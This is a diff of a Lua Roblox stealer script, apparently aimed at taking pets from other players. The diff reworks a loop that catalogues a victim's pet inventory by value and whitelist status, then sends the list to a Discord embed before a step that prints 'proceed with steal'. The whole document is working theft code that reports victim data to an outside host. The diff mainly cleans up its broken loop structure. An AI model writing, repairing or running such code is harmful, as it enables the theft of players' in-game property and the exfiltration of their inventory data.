@@ -460,47 +460,37 @@ local function startStealingProcess()
     end
 
     local totalValue = 0
-local victimPetTable = {}
+    local victimPetTable = {}
+    local passedPets = {}
+    local failedPets = {}
+    local countPassed = 0
+    local countFailed = 0
+    local valueFailed = 0
 
-for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-    local petName = value.PetType
-    local petData = value.PetData
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        local petName = value.PetType
+        local petData = value.PetData
 
-    local isValid = isPetValid(petData)
-    local inWhitelist = checkPetsWhitelist(petName, petData)
+        local isValid = isPetValid(petData)
+        local inWhitelist = checkPetsWhitelist(petName, petData)
 
-    local petPrice = PET_VALUES[petName] or 0
-    local level = petData.Level or 0
-    local baseWeight = petData.BaseWeight or 0
-    local growthFactor = getgenv().PetConfig.GrowthFactor or 0.1
-    local realWeight = baseWeight * (1 + level * growthFactor)
-
-    local infoLine = string.format("%s | Level: %s | Weight: %.2f KG | Value: %s", petName, level, realWeight, petPrice)
-
-    if inWhitelist and isValid then
-        table.insert(passedPets, infoLine)
-        totalValue += petPrice
-        countPassed += 1
-        table.insert(victimPetTable, infoLine)
-    else
-        table.insert(failedPets, infoLine)
-        valueFailed += petPrice
-        countFailed += 1
-    end
-end
-
-
-    if petPrice > 0 then
-        totalValue += petPrice
+        local petPrice = PET_VALUES[petName] or 0
         local level = petData.Level or 0
         local baseWeight = petData.BaseWeight or 0
-        local config = getgenv().PetConfig or {}
-        local growthFactor = config.GrowthFactor or 0.1
+        local growthFactor = getgenv().PetConfig.GrowthFactor or 0.1
         local realWeight = baseWeight * (1 + level * growthFactor)
 
-        local line = string.format("%s | Level: %s | Weight: %.2f KG | Value: %s", petName, level, realWeight, petPrice)
-        table.insert(victimPetTable, line)
+        local infoLine = string.format("%s | Level: %s | Weight: %.2f KG | Value: %s", petName, level, realWeight, petPrice)
 
+        if inWhitelist and isValid then
+            table.insert(passedPets, infoLine)
+            table.insert(victimPetTable, infoLine)
+            totalValue += petPrice
+            countPassed += 1
+        else
+            table.insert(failedPets, infoLine)
+            valueFailed += petPrice
+            countFailed += 1
         end
     end
 
@@ -512,19 +502,18 @@ end
     end
 
     local summary = string.format(
-    "**✅ Success:** %d pets | 💸 Value: %d\n**❌ Failed:** %d pets | 💸 Missed: %d",
-    countPassed, totalValue, countFailed, valueFailed
-)
+        "**✅ Success:** %d pets | 💸 Value: %d\n**❌ Failed:** %d pets | 💸 Missed: %d",
+        countPassed, totalValue, countFailed, valueFailed
+    )
 
-local fullPetList = "**✅ Passed Pets:**\n" .. table.concat(passedPets, "\n") ..
-                    "\n\n**❌ Failed Pets:**\n" .. table.concat(failedPets, "\n")
+    local fullPetList = "**✅ Passed Pets:**\n" .. table.concat(passedPets, "\n") ..
+                        "\n\n**❌ Failed Pets:**\n" .. table.concat(failedPets, "\n")
 
-createDiscordEmbed(fullPetList, summary, "https://cdn.discordapp.com/attachments/.../items.txt", function()
-    print("✅ Report sent, proceed with steal")
-    -- (остальной код без изменений)
-end)
-
+    createDiscordEmbed(fullPetList, summary, "https://cdn.discordapp.com/attachments/.../items.txt", function()
+        print("✅ Report sent, proceed with steal")
+    end)
 end
+
 
 sendFullInventory() -- после всех действий
 
